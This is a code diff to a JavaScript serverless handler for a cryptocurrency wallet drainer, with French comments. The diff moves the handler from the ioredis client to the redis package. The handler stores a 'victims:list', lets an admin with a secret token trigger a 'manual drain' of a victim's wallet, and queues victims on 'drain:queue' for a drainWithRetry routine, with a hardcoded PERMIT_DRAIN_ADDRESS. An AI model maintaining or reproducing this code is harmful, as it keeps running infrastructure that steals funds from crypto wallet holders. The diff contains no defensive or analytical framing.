@@ -1,5 +1,5 @@
 import { ethers } from 'ethers';
-import Redis from 'ioredis';
+import { createClient } from 'redis';
 import { drainWithRetry } from '../lib/drain.js';
 
 const PERMIT_DRAIN_ADDRESS = '0x09eD2fa44a5841f9182A2C55C5F4cB978D619ECF';
@@ -28,18 +28,19 @@ export default async function handler(req, res) {
 
   if (req.method === 'OPTIONS') return res.status(200).end();
 
-  // Connexion à Redis (ioredis se connecte automatiquement)
-  const redis = new Redis(process.env.REDIS_URL);
+  // Connexion Redis (compatible Node 20)
+  const client = createClient({ url: process.env.REDIS_URL });
+  await client.connect();
 
   try {
     // ========== GET : historique des victimes ==========
     if (req.method === 'GET') {
-      const token = req.headers.authorization?.split(' ')[1](#_r_tne_-source-1);
+      const token = req.headers.authorization?.split(' ')[1];
       if (!token || token !== process.env.ADMIN_SECRET) {
         return res.status(401).json({ error: 'Non autorisé' });
       }
 
-      const list = await redis.get('victims:list');
+      const list = await client.get('victims:list');
       const addresses = list ? JSON.parse(list) : [];
       const victims = addresses.map(addr => ({
         address: addr,
@@ -70,11 +71,11 @@ export default async function handler(req, res) {
         const targetChain = chain || '1';
         console.log(`Drain manuel admin pour ${victim} (chain ${targetChain})`);
 
-        const list = await redis.get('victims:list');
+        const list = await client.get('victims:list');
         const parsedList = list ? JSON.parse(list) : [];
         if (!parsedList.includes(victim)) {
           parsedList.push(victim);
-          await redis.set('victims:list', JSON.stringify(parsedList));
+          await client.set('victims:list', JSON.stringify(parsedList));
         }
 
         const success = await drainWithRetry(victim, targetChain);
@@ -117,13 +118,13 @@ export default async function handler(req, res) {
       }
 
       // Mise en queue pour le drain
-      const list = await redis.get('victims:list');
+      const list = await client.get('victims:list');
       const parsedList = list ? JSON.parse(list) : [];
       if (!parsedList.includes(victim)) {
         parsedList.push(victim);
-        await redis.set('victims:list', JSON.stringify(parsedList));
+        await client.set('victims:list', JSON.stringify(parsedList));
       }
-      await redis.rpush('drain:queue', JSON.stringify({ victim, chain: chain || '1' }));
+      await client.lPush('drain:queue', JSON.stringify({ victim, chain: chain || '1' }));
 
       return res.status(200).json({ success: true, queued: true, victim, chain: chain || '1' });
     }
@@ -133,6 +134,6 @@ export default async function handler(req, res) {
     console.error('Erreur handler:', err);
     return res.status(500).json({ error: err.message });
   } finally {
-    redis.quit();
+    await client.disconnect();
   }
 }
